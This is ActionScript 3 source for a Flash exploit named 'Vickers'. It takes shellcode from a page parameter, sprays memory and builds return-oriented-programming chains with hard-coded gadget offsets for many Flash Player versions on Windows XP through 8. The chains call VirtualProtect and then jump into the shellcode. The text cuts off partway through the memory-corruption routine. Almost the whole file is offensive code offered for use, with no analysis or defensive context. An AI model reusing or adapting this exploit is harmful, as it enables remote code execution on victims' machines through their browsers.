//Compile with mxmlc Vickers.as -o Vickers.swf
package 
{
	import flash.display.Sprite;
	import flash.system.Capabilities;
	import flash.utils.ByteArray;
	import __AS3__.vec.Vector;
	import flash.system.ApplicationDomain;
	import avm2.intrinsics.memory.*;
	
	public class Vickers extends Sprite 
	{
		
		public static var shellcode:String;
		
		public function Vickers()
		{
			var params = root.loaderInfo.parameters;
			shellcode = params["id"];
			while (true)
			{
				if (exploit()) break;
			};
		}
		
		public function makePayload(vftableAddr:*, scAddr:*):ByteArray
		{
			var payload = null;
			switch (Capabilities.os.toLowerCase())
			{
				case "windows xp":
				case "windows vista":
				case "windows server 2003 r2":
				case "windows server 2003":
				case "windows 7":
				case "windows 7 x64":
				case "windows server 2008 r2":
				case "windows server 2008":
					payload = makePayloadWinOther(vftableAddr, scAddr);
					break;
				case "windows 8":
				case "windows 8 x64":
					payload = makePayloadWin8(vftableAddr, scAddr);
					break;
				default:
					return (null);
			};
			return (payload);
		}
		
		public function makePayloadWin8(vftableAddr:*, scAddr:*):ByteArray
		{
			var flash_base:uint = vftableAddr;
			var flash_end:uint;
			var rop_payload:ByteArray = new ByteArray();
			rop_payload.position = 0;
			rop_payload.endian = "littleEndian";
			rop_payload.writeUnsignedInt((scAddr + 4));
			switch (Capabilities.version.toLowerCase())
			{
				case "win 11,3,372,94":
					flash_base = (flash_base - 9518744);
					flash_end = (flash_base + 0xB10000);
					rop_payload.writeUnsignedInt((flash_base + 0x401404)); // add esp, 0x44; ret 
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 0x26525));  // xchg eax, esp; ret
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 0x10c5));   // pop eax; ret
					rop_payload.writeUnsignedInt((flash_base + 0x817420)); // ptr to KERNEL32!VirtualProtectStub 
					rop_payload.writeUnsignedInt((flash_base + 0x9e16));   // mov eax, dword ptr [eax]; ret
					rop_payload.writeUnsignedInt((flash_base + 0xcc022));  // push eax; ret 
					rop_payload.writeUnsignedInt((flash_base + 0x3157c));  // jmp esp ; ret after VirtualProtect
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(0x40);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,375,10":
					flash_base = (flash_base - 9589392);
					flash_end = (flash_base + 0xB15000);
					rop_payload.writeUnsignedInt((flash_base + 4220004));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 142215));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8504352));
					rop_payload.writeUnsignedInt((flash_base + 40214));
					rop_payload.writeUnsignedInt((flash_base + 840082));
					rop_payload.writeUnsignedInt((flash_base + 202134));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,376,12":
					flash_base = (flash_base - 9593552);
					flash_end = (flash_base + 0xB16000);
					rop_payload.writeUnsignedInt((flash_base + 4220740));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 142023));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8508448));
					rop_payload.writeUnsignedInt((flash_base + 39878));
					rop_payload.writeUnsignedInt((flash_base + 839538));
					rop_payload.writeUnsignedInt((flash_base + 201958));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,377,15":
					flash_base = (flash_base - 9589576);
					flash_end = (flash_base + 0xB15000);
					rop_payload.writeUnsignedInt((flash_base + 4220388));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 141671));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8504352));
					rop_payload.writeUnsignedInt((flash_base + 39526));
					rop_payload.writeUnsignedInt((flash_base + 839698));
					rop_payload.writeUnsignedInt((flash_base + 201590));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,378,5":
					flash_base = (flash_base - 9589448);
					flash_end = (flash_base + 0xB15000);
					rop_payload.writeUnsignedInt((flash_base + 4220388));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 141671));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8504352));
					rop_payload.writeUnsignedInt((flash_base + 39526));
					rop_payload.writeUnsignedInt((flash_base + 839698));
					rop_payload.writeUnsignedInt((flash_base + 201590));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,379,14":
					flash_base = (flash_base - 9597856);
					flash_end = (flash_base + 0xB17000);
					rop_payload.writeUnsignedInt((flash_base + 4575113));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 6617808));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 8149060));
					rop_payload.writeUnsignedInt((flash_base + 8512544));
					rop_payload.writeUnsignedInt((flash_base + 4907562));
					rop_payload.writeUnsignedInt((flash_base + 8147977));
					rop_payload.writeUnsignedInt((flash_base + 4046601));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,6,602,167":
					flash_base = (flash_base - 9821704);
					flash_end = (flash_base + 0xB85000);
					rop_payload.writeUnsignedInt((flash_base + 8405950));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 27456));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8791088));
					rop_payload.writeUnsignedInt((flash_base + 73494));
					rop_payload.writeUnsignedInt((flash_base + 1115794));
					rop_payload.writeUnsignedInt((flash_base + 242790));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,6,602,171":
					flash_base = (flash_base - 9821904);
					flash_end = (flash_base + 0xB85000);
					rop_payload.writeUnsignedInt((flash_base + 8406414));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 27456));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8791088));
					rop_payload.writeUnsignedInt((flash_base + 73078));
					rop_payload.writeUnsignedInt((flash_base + 1116754));
					rop_payload.writeUnsignedInt((flash_base + 242380));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,6,602,180":
					flash_base = (flash_base - 9816600);
					flash_end = (flash_base + 0xB84000);
					rop_payload.writeUnsignedInt((flash_base + 8404478));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 29514));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 8786992));
					rop_payload.writeUnsignedInt((flash_base + 69382));
					rop_payload.writeUnsignedInt((flash_base + 175197));
					rop_payload.writeUnsignedInt((flash_base + 238732));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,7,700,169":
					flash_base = (flash_base - 10441412);
					flash_end = (flash_base + 0xC45000);
					rop_payload.writeUnsignedInt((flash_base + 4640769));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 53338));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 9368732));
					rop_payload.writeUnsignedInt((flash_base + 95414));
					rop_payload.writeUnsignedInt((flash_base + 1145506));
					rop_payload.writeUnsignedInt((flash_base + 2156132));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,7,700,202":
					flash_base = (flash_base - 0x9f5470);
					flash_end = (flash_base + 0xC45000);
					rop_payload.writeUnsignedInt((flash_base + 0x46c361));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 0xcc5a));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 0x10c5));
					rop_payload.writeUnsignedInt((flash_base + 0x8ef49c));
					rop_payload.writeUnsignedInt((flash_base + 0x17136));
					rop_payload.writeUnsignedInt((flash_base + 0x42f0));
					rop_payload.writeUnsignedInt((flash_base + 0x40664));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,7,700,224":
					flash_base = (flash_base - 10450228);
					flash_end = (flash_base + 0xC7A000);
					rop_payload.writeUnsignedInt((flash_base + 4646881));
					rop_payload.position = 64;
					rop_payload.writeUnsignedInt((flash_base + 52090));
					rop_payload.position = 76;
					rop_payload.writeUnsignedInt((flash_base + 4293));
					rop_payload.writeUnsignedInt((flash_base + 9376924));
					rop_payload.writeUnsignedInt((flash_base + 93510));
					rop_payload.writeUnsignedInt((flash_base + 1145378));
					rop_payload.writeUnsignedInt((flash_base + 1909483));
					rop_payload.writeUnsignedInt(scAddr);
					rop_payload.writeUnsignedInt(0x1000);
					rop_payload.writeUnsignedInt(64);
					rop_payload.writeUnsignedInt((scAddr - 4));
					break;
				default:
					return (null);
			};
			return (rop_payload);
		}
		
		public function makePayloadWinOther(vftableAddr:*, scAddr:*):ByteArray
		{
			var vftableAddr_copy:uint = vftableAddr;
			var _local_5:uint;
			var payload:ByteArray = new ByteArray();
			payload.position = 0;
			payload.endian = "littleEndian";
			payload.writeUnsignedInt((scAddr + 4));
			switch (Capabilities.version.toLowerCase())
			{
				case "win 11,0,1,152":
					vftableAddr_copy = (vftableAddr_copy - 7628676);
					_local_5 = (vftableAddr_copy + 0x927000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 1041567));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 1937003));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 4585805));
					payload.writeUnsignedInt((vftableAddr_copy + 6697912));
					payload.writeUnsignedInt((vftableAddr_copy + 2201532));
					payload.writeUnsignedInt((vftableAddr_copy + 3985044));
					payload.writeUnsignedInt((vftableAddr_copy + 2764856));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,1,102,55":
					vftableAddr_copy = (vftableAddr_copy - 7633040);
					_local_5 = (vftableAddr_copy + 0x927000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 4793772));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 1939267));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 2297101));
					payload.writeUnsignedInt((vftableAddr_copy + 6702008));
					payload.writeUnsignedInt((vftableAddr_copy + 3976335));
					payload.writeUnsignedInt((vftableAddr_copy + 3516263));
					payload.writeUnsignedInt((vftableAddr_copy + 2768033));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,1,102,62":
					vftableAddr_copy = (vftableAddr_copy - 7628912);
					_local_5 = (vftableAddr_copy + 0x927000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 4794156));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 1939856));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 5126527));
					payload.writeUnsignedInt((vftableAddr_copy + 6702008));
					payload.writeUnsignedInt((vftableAddr_copy + 2920469));
					payload.writeUnsignedInt((vftableAddr_copy + 4454837));
					payload.writeUnsignedInt((vftableAddr_copy + 2768325));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,1,102,63":
					vftableAddr_copy = (vftableAddr_copy - 7628904);
					_local_5 = (vftableAddr_copy + 0x927000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 4794076));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 1939822));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 5126435));
					payload.writeUnsignedInt((vftableAddr_copy + 6702008));
					payload.writeUnsignedInt((vftableAddr_copy + 2353542));
					payload.writeUnsignedInt((vftableAddr_copy + 3516455));
					payload.writeUnsignedInt((vftableAddr_copy + 2768305));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,2,202,228":
					vftableAddr_copy = (vftableAddr_copy - 7726032);
					_local_5 = (vftableAddr_copy + 0x93F000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 4947482));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 2022234));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 6255948));
					payload.writeUnsignedInt((vftableAddr_copy + 6824832));
					payload.writeUnsignedInt((vftableAddr_copy + 5021261));
					payload.writeUnsignedInt((vftableAddr_copy + 6176368));
					payload.writeUnsignedInt((vftableAddr_copy + 2847152));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,2,202,233":
					vftableAddr_copy = (vftableAddr_copy - 7729872);
					_local_5 = (vftableAddr_copy + 0x93F000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 4947594));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 2022508));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 4691374));
					payload.writeUnsignedInt((vftableAddr_copy + 6824832));
					payload.writeUnsignedInt((vftableAddr_copy + 4164715));
					payload.writeUnsignedInt((vftableAddr_copy + 5837496));
					payload.writeUnsignedInt((vftableAddr_copy + 2847021));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,2,202,235":
					vftableAddr_copy = (vftableAddr_copy - 7734032);
					_local_5 = (vftableAddr_copy + 0x940000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 4947578));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 2022729));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 5249755));
					payload.writeUnsignedInt((vftableAddr_copy + 6828928));
					payload.writeUnsignedInt((vftableAddr_copy + 4261382));
					payload.writeUnsignedInt((vftableAddr_copy + 4553024));
					payload.writeUnsignedInt((vftableAddr_copy + 2847456));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,300,257":
					vftableAddr_copy = (vftableAddr_copy - 8232016);
					_local_5 = (vftableAddr_copy + 0x9C3000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 5328586));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 2069614));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 6497300));
					payload.writeUnsignedInt((vftableAddr_copy + 7222148));
					payload.writeUnsignedInt((vftableAddr_copy + 5022322));
					payload.writeUnsignedInt((vftableAddr_copy + 4972967));
					payload.writeUnsignedInt((vftableAddr_copy + 3071572));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,3,300,273":
					vftableAddr_copy = (vftableAddr_copy - 8236216);
					_local_5 = (vftableAddr_copy + 0x9C4000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 5331930));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 2070667));
					payload.position = 80;
					payload.writeUnsignedInt((vftableAddr_copy + 6500737));
					payload.writeUnsignedInt((vftableAddr_copy + 7226252));
					payload.writeUnsignedInt((vftableAddr_copy + 5142060));
					payload.writeUnsignedInt((vftableAddr_copy + 5127634));
					payload.writeUnsignedInt((vftableAddr_copy + 3074828));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,4,402,278":
					vftableAddr_copy = (vftableAddr_copy - 8503560);
					_local_5 = (vftableAddr_copy + 0xA23000);
					payload.writeUnsignedInt((vftableAddr_copy + 5581452));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 1202409));
					payload.position = 76;
					payload.writeUnsignedInt((vftableAddr_copy + 6927402));
					payload.writeUnsignedInt((vftableAddr_copy + 7480208));
					payload.writeUnsignedInt((vftableAddr_copy + 5373116));
					payload.writeUnsignedInt((vftableAddr_copy + 5713520));
					payload.writeUnsignedInt((vftableAddr_copy + 3269652));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,4,402,287":
					vftableAddr_copy = (vftableAddr_copy - 8507728);
					_local_5 = (vftableAddr_copy + 0xA24000);
					payload.writeUnsignedInt((vftableAddr_copy + 5582348));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 1202841));
					payload.position = 76;
					payload.writeUnsignedInt((vftableAddr_copy + 6927143));
					payload.writeUnsignedInt((vftableAddr_copy + 7484304));
					payload.writeUnsignedInt((vftableAddr_copy + 5481024));
					payload.writeUnsignedInt((vftableAddr_copy + 5107604));
					payload.writeUnsignedInt((vftableAddr_copy + 5747979));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,5,502,110":
					vftableAddr_copy = (vftableAddr_copy - 11716376);
					_local_5 = (vftableAddr_copy + 0xEC6000);
					payload.position = 20;
					payload.writeUnsignedInt((vftableAddr_copy + 9813154));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 448623));
					payload.position = 96;
					payload.writeUnsignedInt((vftableAddr_copy + 9326463));
					payload.writeUnsignedInt((vftableAddr_copy + 10691852));
					payload.writeUnsignedInt((vftableAddr_copy + 5731300));
					payload.writeUnsignedInt((vftableAddr_copy + 8910259));
					payload.writeUnsignedInt((vftableAddr_copy + 8630687));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,5,502,135":
					vftableAddr_copy = (vftableAddr_copy - 11716400);
					_local_5 = (vftableAddr_copy + 0xEC6000);
					payload.writeUnsignedInt((vftableAddr_copy + 1101327));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 4733912));
					payload.position = 76;
					payload.writeUnsignedInt((vftableAddr_copy + 4540));
					payload.writeUnsignedInt((vftableAddr_copy + 10691852));
					payload.writeUnsignedInt((vftableAddr_copy + 28862));
					payload.writeUnsignedInt((vftableAddr_copy + 512197));
					payload.writeUnsignedInt((vftableAddr_copy + 1560889));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,5,502,146":
					vftableAddr_copy = (vftableAddr_copy - 11716320);
					_local_5 = (vftableAddr_copy + 0xEC6000);
					payload.writeUnsignedInt((vftableAddr_copy + 1101327));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 4733912));
					payload.position = 76;
					payload.writeUnsignedInt((vftableAddr_copy + 4540));
					payload.writeUnsignedInt((vftableAddr_copy + 10691852));
					payload.writeUnsignedInt((vftableAddr_copy + 28862));
					payload.writeUnsignedInt((vftableAddr_copy + 512197));
					payload.writeUnsignedInt((vftableAddr_copy + 1560889));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,5,502,149":
					vftableAddr_copy = (vftableAddr_copy - 11712240);
					_local_5 = (vftableAddr_copy + 0xEC6000);
					payload.position = 5;
					payload.writeUnsignedInt((vftableAddr_copy + 10373824));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 4331881));
					payload.position = 77;
					payload.writeUnsignedInt((vftableAddr_copy + 9292830));
					payload.writeUnsignedInt((vftableAddr_copy + 10691852));
					payload.writeUnsignedInt((vftableAddr_copy + 5731956));
					payload.writeUnsignedInt((vftableAddr_copy + 7150772));
					payload.writeUnsignedInt((vftableAddr_copy + 3344264));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,6,602,168":
					vftableAddr_copy = (vftableAddr_copy - 11825816);
					_local_5 = (vftableAddr_copy + 0xEE9000);
					payload.position = 5;
					payload.writeUnsignedInt((vftableAddr_copy + 9924439));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 4370139));
					payload.position = 77;
					payload.writeUnsignedInt((vftableAddr_copy + 9564155));
					payload.writeUnsignedInt((vftableAddr_copy + 10736920));
					payload.writeUnsignedInt((vftableAddr_copy + 5830863));
					payload.writeUnsignedInt((vftableAddr_copy + 9044861));
					payload.writeUnsignedInt((vftableAddr_copy + 7984191));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,6,602,171":
					vftableAddr_copy = (vftableAddr_copy - 11834040);
					_local_5 = (vftableAddr_copy + 0xEEA000);
					payload.position = 5;
					payload.writeUnsignedInt((vftableAddr_copy + 9925589));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 4370636));
					payload.position = 77;
					payload.writeUnsignedInt((vftableAddr_copy + 9564442));
					payload.writeUnsignedInt((vftableAddr_copy + 10741016));
					payload.writeUnsignedInt((vftableAddr_copy + 5771380));
					payload.writeUnsignedInt((vftableAddr_copy + 10153408));
					payload.writeUnsignedInt((vftableAddr_copy + 7983199));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,6,602,180":
					vftableAddr_copy = (vftableAddr_copy - 11824712);
					_local_5 = (vftableAddr_copy + 0xEE9000);
					payload.position = 5;
					payload.writeUnsignedInt((vftableAddr_copy + 9923173));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 4368414));
					payload.position = 77;
					payload.writeUnsignedInt((vftableAddr_copy + 9562061));
					payload.writeUnsignedInt((vftableAddr_copy + 10736920));
					payload.writeUnsignedInt((vftableAddr_copy + 5828990));
					payload.writeUnsignedInt((vftableAddr_copy + 9042989));
					payload.writeUnsignedInt((vftableAddr_copy + 8661666));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,7,700,169":
					vftableAddr_copy = (vftableAddr_copy - 12902952);
					_local_5 = (vftableAddr_copy + 16904192);
					payload.writeUnsignedInt((vftableAddr_copy + 1116239));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 10368763));
					payload.position = 76;
					payload.writeUnsignedInt((vftableAddr_copy + 2586086));
					payload.writeUnsignedInt((vftableAddr_copy + 11752328));
					payload.writeUnsignedInt((vftableAddr_copy + 32732));
					payload.writeUnsignedInt((vftableAddr_copy + 8192266));
					payload.writeUnsignedInt((vftableAddr_copy + 1578904));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,7,700,202":
					vftableAddr_copy = (vftableAddr_copy - 0xc4f508);
					_local_5 = (vftableAddr_copy + 0x101f000);
					payload.position = 8;
					payload.writeUnsignedInt((vftableAddr_copy + 0x7dfcd2)); // 107dfcd2 : add esp,44h ; ret
					payload.position = 0x40;
					payload.writeUnsignedInt((vftableAddr_copy + 0x12a269)); // 1012a269 : xchg edx,esp ; add  eax,dword ptr [eax]; add  byte ptr [edi+5Eh],bl ; pop ecx ; ret 
					payload.position = 0x50;
					payload.writeUnsignedInt((vftableAddr_copy + 0xcb497));  // 100cb497 : pop eax ; ret
					payload.writeUnsignedInt((vftableAddr_copy + 0xb35388)); // 10b35388 : ptr to VirtualProtect 
					payload.writeUnsignedInt((vftableAddr_copy + 0x110d3d)); // 10110d3d : mov eax,dword ptr [eax] ; ret
					payload.writeUnsignedInt((vftableAddr_copy + 0x887362)); // 10887362 : push eax ; ret
					payload.writeUnsignedInt((vftableAddr_copy + 0x331bff)); // 10331bff : jmp esp
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(0x40);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,8,800,97":
					vftableAddr_copy = (vftableAddr_copy - 129165844);
					_local_5 = (vftableAddr_copy + 16904192);
					payload.position = 8;
					payload.writeUnsignedInt(vftableAddr_copy);
					payload.position = 16;
					payload.writeUnsignedInt((vftableAddr_copy + 117625919));
					payload.writeUnsignedInt(-1810746282);
					payload.writeUnsignedInt((scAddr + 76));
					payload.writeUnsignedInt((vftableAddr_copy + 122565891));
					payload.position = 44;
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 0x0400));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 123362382));
					payload.position = 80;
					payload.writeUnsignedInt((scAddr + 192));
					payload.position = 112;
					payload.writeUnsignedInt((vftableAddr_copy + 32365));
					payload.writeUnsignedInt((vftableAddr_copy + 11760520));
					payload.writeUnsignedInt((vftableAddr_copy + 1117213));
					payload.writeUnsignedInt((vftableAddr_copy + 3721232));
					payload.writeUnsignedInt((vftableAddr_copy + 8274178));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				case "win 11,8,800,50":
					vftableAddr_copy = (vftableAddr_copy - 12936000);
					_local_5 = (vftableAddr_copy + 17149952);
					payload.writeUnsignedInt((vftableAddr_copy + 404531));
					payload.position = 64;
					payload.writeUnsignedInt((vftableAddr_copy + 2583617));
					payload.position = 72;
					payload.writeUnsignedInt((vftableAddr_copy + 7914140));
					payload.writeUnsignedInt((vftableAddr_copy + 4550));
					payload.writeUnsignedInt((vftableAddr_copy + 11780992));
					payload.writeUnsignedInt((vftableAddr_copy + 32684));
					payload.writeUnsignedInt((vftableAddr_copy + 142358));
					payload.writeUnsignedInt((vftableAddr_copy + 1577816));
					payload.writeUnsignedInt(scAddr);
					payload.writeUnsignedInt(0x1000);
					payload.writeUnsignedInt(64);
					payload.writeUnsignedInt((scAddr - 4));
					break;
				default:
					return (null);
			};
			return (payload);
		}
		
		public function exploit():Boolean
		{
			var vector_objects_entry_length:int;
			var shellcode_byte = null;
			var _local_6:uint;
			var i:int;
			var vftable_addr:uint;
			var shellcode_address:uint;
			var vector_objects_entry_idx:uint;
			var length_vector_byte_arrays:uint;
			var vector_byte_arrays:Vector.<ByteArray> = new Vector.<ByteArray>(0);
			var vector_objects:Vector.<Object> = new Vector.<Object>(0);
			var twos_object:Object = new <Object>[2, 2, 2, 2, 2, 2, 2, 2];
			var vickers_byte_array:ByteArray = new ByteArray();
			while (i < 0x0500)
			{
				vector_byte_arrays[i] = new ByteArray();
				vector_byte_arrays[i].length = ApplicationDomain.MIN_DOMAIN_MEMORY_LENGTH;
				i++;
			};
			vickers_byte_array.writeUTFBytes("vickers");
			vickers_byte_array.length = ApplicationDomain.MIN_DOMAIN_MEMORY_LENGTH;
			ApplicationDomain.currentDomain.domainMemory = vickers_byte_array;
			vector_byte_arrays[i] = new ByteArray();
			vector_byte_arrays[i].length = ApplicationDomain.MIN_DOMAIN_MEMORY_LENGTH;
			length_vector_byte_arrays = i;
			i = 0;
			while (i < (vector_byte_arrays.length - 1))
